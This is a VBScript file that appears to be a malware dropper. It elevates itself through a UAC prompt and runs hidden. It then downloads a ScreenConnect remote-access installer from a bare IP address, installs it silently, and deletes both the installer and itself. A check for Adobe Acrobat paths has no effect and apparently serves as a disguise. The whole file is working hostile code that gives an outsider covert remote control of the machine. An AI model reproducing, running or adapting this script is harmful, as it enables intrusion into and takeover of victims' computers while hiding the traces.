
Option Explicit


If Not WScript.Arguments.Named.Exists("elevate") Then
    Dim objShellApp
    Set objShellApp = CreateObject("Shell.Application")
    objShellApp.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevate", "", "runas", 0
    Set objShellApp = Nothing
    WScript.Quit
End If


Dim objShell, objFSO, objHTTP, objStream
Dim url, savePath, tempPath, adobePath

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")


tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")


adobePath = FindAdobePath()

If adobePath <> "" Then
    ' Adobe found - proceed
Else
    ' Adobe not found - continue anyway
End If


url = "http://207.174.0.98/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
savePath = tempPath & "\ScreenConnect.ClientSetup.msi"

On Error Resume Next

' Download file
Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
If Err.Number <> 0 Then
    Set objHTTP = CreateObject("MSXML2.XMLHTTP")
    If Err.Number <> 0 Then
        Set objHTTP = CreateObject("Microsoft.XMLHTTP")
    End If
End If

If Not objHTTP Is Nothing Then
    objHTTP.Open "GET", url, False
    objHTTP.Send
    
    If objHTTP.Status = 200 Then
        Set objStream = CreateObject("ADODB.Stream")
        objStream.Type = 1
        objStream.Open
        objStream.Write objHTTP.ResponseBody
        objStream.SaveToFile savePath, 2
        objStream.Close
        Set objStream = Nothing
    End If
End If

Set objHTTP = Nothing

' ============================================
' INSTALL MSI
' ============================================
If objFSO.FileExists(savePath) Then
    ' Try MSI install
    objShell.Run "msiexec.exe /i """ & savePath & """ /quiet /norestart", 0, True
    
    ' Wait and clean up
    WScript.Sleep 2000
    On Error Resume Next
    objFSO.DeleteFile savePath, True
    On Error GoTo 0
End If


On Error Resume Next
objFSO.DeleteFile WScript.ScriptFullName, True
On Error GoTo 0

WScript.Quit 0


Function FindAdobePath()
    Dim path, regPath, adobePaths
    
    ' Array of common Adobe paths
    adobePaths = Array( _
        "C:\Program Files\Adobe\Acrobat DC\Acrobat", _
        "C:\Program Files (x86)\Adobe\Acrobat DC\Acrobat", _
        "C:\Program Files\Adobe\Acrobat Reader DC\Reader", _
        "C:\Program Files (x86)\Adobe\Acrobat Reader DC\Reader", _
        "C:\Program Files\Adobe\Acrobat 2020\Acrobat", _
        "C:\Program Files (x86)\Adobe\Acrobat 2020\Acrobat" _
    )
    
    ' Check common paths
    For Each path In adobePaths
        If objFSO.FileExists(path & "\Acrobat.exe") Or _
           objFSO.FileExists(path & "\AcroRd32.exe") Then
            FindAdobePath = path
            Exit Function
        End If
    Next
    
    ' Check registry
    On Error Resume Next
    regPath = objShell.RegRead("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Acrobat.exe\")
    If regPath <> "" Then
        FindAdobePath = objFSO.GetParentFolderName(regPath)
        On Error GoTo 0
        Exit Function
    End If
    
    regPath = objShell.RegRead("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\AcroRd32.exe\")
    If regPath <> "" Then
        FindAdobePath = objFSO.GetParentFolderName(regPath)
        On Error GoTo 0
        Exit Function
    End If
    
    On Error GoTo 0
    FindAdobePath = ""
End Function
